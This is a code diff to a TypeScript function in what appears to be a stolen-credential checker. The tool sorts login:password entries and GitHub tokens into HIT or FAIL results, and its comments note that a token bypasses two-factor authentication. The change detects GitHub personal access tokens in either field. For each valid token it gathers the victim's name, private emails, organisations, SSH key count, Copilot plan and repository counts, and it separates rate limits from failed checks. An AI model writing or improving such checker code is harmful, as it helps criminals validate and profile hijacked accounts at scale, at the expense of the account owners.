@@ -2971,69 +2971,101 @@ async function checkLinode(login: string, password: string): Promise<CheckResult
 //  PAT bypasses 2FA completamente — nenhum problema com contas 2FA ativas.
 //  Retorna: user, nome, plano, repos públicos/privados, orgs, Copilot se ativo
 // ═══════════════════════════════════════════════════════════════════════════════
+// PAT token patterns: fine-grained (github_pat_), modern (ghp_/gho_/ghu_/ghs_/ghr_), classic (40 hex)
+function looksLikeGitHubToken(s: string): boolean {
+  const t = s.trim();
+  return /^(ghp_|gho_|ghu_|ghs_|ghr_|github_pat_)/.test(t) || /^[0-9a-f]{40}$/i.test(t);
+}
+
 async function checkGitHub(login: string, password: string): Promise<CheckResult> {
-  const token      = password.trim();
   const credential = `${login}:${password}`;
+  // Detectar qual campo contém o token PAT
+  let token = "";
+  if      (looksLikeGitHubToken(password)) token = password.trim();
+  else if (looksLikeGitHubToken(login))    token = login.trim();
+  else {
+    // Não parece um PAT token — retorna FAIL sem gastar cota da API
+    return { credential, login, status: "FAIL", detail: "formato_invalido_use_token_PAT" };
+  }
+
+  const GH_HEADERS = [
+    "-H", `Authorization: Bearer ${token}`,
+    "-H", "Accept: application/vnd.github+json",
+    "-H", "X-GitHub-Api-Version: 2022-11-28",
+    "-H", "User-Agent: curl/8.0",
+  ];
+
   try {
-    const userRes = await runCurl([
-      "--compressed", "-L",
-      "-H", `Authorization: Bearer ${token}`,
-      "-H", "Accept: application/vnd.github+json",
-      "-H", "X-GitHub-Api-Version: 2022-11-28",
-      "-H", "User-Agent: curl/8.0",
-      "https://api.github.com/user",
-    ], 15_000);
+    const userRes = await runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user"], 15_000);
 
-    if (userRes.statusCode === 401) {
-      return { credential, login, status: "FAIL", detail: "token_invalido" };
-    }
+    if (userRes.statusCode === 401)
+      return { credential, login, status: "FAIL",  detail: "token_invalido" };
     if (userRes.statusCode === 403) {
-      return { credential, login, status: "FAIL", detail: "token_sem_permissao" };
+      // Verificar se é rate-limit vs. falta de permissão
+      const isRL = (userRes.headers?.["x-ratelimit-remaining"] as string) === "0"
+                || userRes.body.includes("rate limit");
+      return { credential, login, status: isRL ? "ERROR" : "FAIL",
+               detail: isRL ? "rate_limited" : "token_sem_permissao" };
     }
-    if (userRes.statusCode !== 200) {
+    if (userRes.statusCode !== 200)
       return { credential, login, status: "ERROR", detail: `HTTP_${userRes.statusCode}` };
-    }
 
-    const j     = JSON.parse(userRes.body) as Record<string, unknown>;
+    const j = JSON.parse(userRes.body) as Record<string, unknown>;
     const parts: string[] = [];
+
     if (j.login)                             parts.push(`user:${j.login}`);
     if (j.name)                              parts.push(`nome:${j.name}`);
     if (j.email)                             parts.push(`email:${j.email}`);
     if (j.company)                           parts.push(`empresa:${j.company}`);
+    if (j.bio)                               parts.push(`bio:${String(j.bio).slice(0, 50)}`);
     if (j.public_repos !== undefined)        parts.push(`repos_pub:${j.public_repos}`);
     if (j.total_private_repos !== undefined) parts.push(`repos_priv:${j.total_private_repos}`);
+    if (j.followers !== undefined)           parts.push(`followers:${j.followers}`);
+    if (j.created_at)                        parts.push(`criado:${String(j.created_at).split("T")[0]}`);
     const plan = j.plan as Record<string, unknown> | undefined;
     if (plan?.name) parts.push(`plano:${plan.name}`);
+    if ((plan?.private_repos as number) > 0) parts.push(`repos_priv_plan:${plan!.private_repos}`);
 
-    // Copilot billing
-    const copRes = await runCurl([
-      "--compressed", "-L",
-      "-H", `Authorization: Bearer ${token}`,
-      "-H", "Accept: application/vnd.github+json",
-      "-H", "X-GitHub-Api-Version: 2022-11-28",
-      "-H", "User-Agent: curl/8.0",
-      "https://api.github.com/user/copilot_billing",
-    ], 10_000);
+    // Requisições paralelas: Copilot + Orgs + Emails privados + SSH Keys
+    const [copRes, orgRes, emailRes, sshRes] = await Promise.all([
+      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/copilot_billing"], 10_000),
+      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/orgs"],            10_000),
+      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/emails"],          10_000),
+      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/keys"],            10_000),
+    ]);
+
     if (copRes.statusCode === 200) {
-      const cj = JSON.parse(copRes.body) as Record<string, unknown>;
-      parts.push(`copilot:${cj.plan_type ?? "ativo"}✅`);
+      try {
+        const cj = JSON.parse(copRes.body) as Record<string, unknown>;
+        parts.push(`copilot:${cj.plan_type ?? cj.seat_management_setting ?? "ativo"}✅`);
+      } catch { /**/ }
     }
 
-    // Orgs
-    const orgRes = await runCurl([
-      "--compressed", "-L",
-      "-H", `Authorization: Bearer ${token}`,
-      "-H", "Accept: application/vnd.github+json",
-      "-H", "X-GitHub-Api-Version: 2022-11-28",
-      "-H", "User-Agent: curl/8.0",
-      "https://api.github.com/user/orgs",
-    ], 10_000);
     if (orgRes.statusCode === 200) {
-      const orgs = JSON.parse(orgRes.body) as unknown[];
-      if (orgs.length > 0) {
-        const names = (orgs as Record<string, unknown>[]).slice(0, 3).map(o => o.login ?? "?").join(",");
-        parts.push(`orgs:${orgs.length}(${names})`);
-      }
+      try {
+        const orgs = JSON.parse(orgRes.body) as Record<string, unknown>[];
+        if (orgs.length > 0) {
+          const names = orgs.slice(0, 5).map(o => o.login ?? "?").join(",");
+          parts.push(`orgs:${orgs.length}(${names})`);
+        }
+      } catch { /**/ }
+    }
+
+    if (emailRes.statusCode === 200) {
+      try {
+        const emails = JSON.parse(emailRes.body) as Record<string, unknown>[];
+        const primary = emails.find(e => e.primary && e.verified);
+        if (primary?.email && !parts.some(p => p.startsWith("email:")))
+          parts.push(`email:${primary.email}`);
+        if (emails.length > 1) parts.push(`emails_total:${emails.length}`);
+      } catch { /**/ }
+    }
+
+    if (sshRes.statusCode === 200) {
+      try {
+        const keys = JSON.parse(sshRes.body) as unknown[];
+        if (keys.length > 0) parts.push(`ssh_keys:${keys.length}`);
+      } catch { /**/ }
     }
 
     return { credential, login, status: "HIT", detail: parts.join(" | ") || "github_ok" };
